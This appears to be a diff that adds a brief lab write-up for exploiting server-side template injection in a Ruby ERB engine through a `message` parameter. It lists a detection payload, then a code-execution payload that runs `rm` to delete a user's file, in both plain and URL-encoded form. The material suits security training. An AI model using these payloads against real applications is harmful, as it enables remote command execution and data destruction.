@@ -1,0 +1,7 @@
+1. Confirm SSTI (ERB Engine):   
+- Inject a simple Ruby mathematical expression into the `message` parameter:
+     - Payload: `<%= 7*7 %>`
+
+2. Exploit to Execute Code:
+   - Payload: `<%= system("rm /home/carlos/morale.txt") %>`
+   - URL Encoded: `/?message=%3C%25%3D+system%28%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22%29+%25%3E`
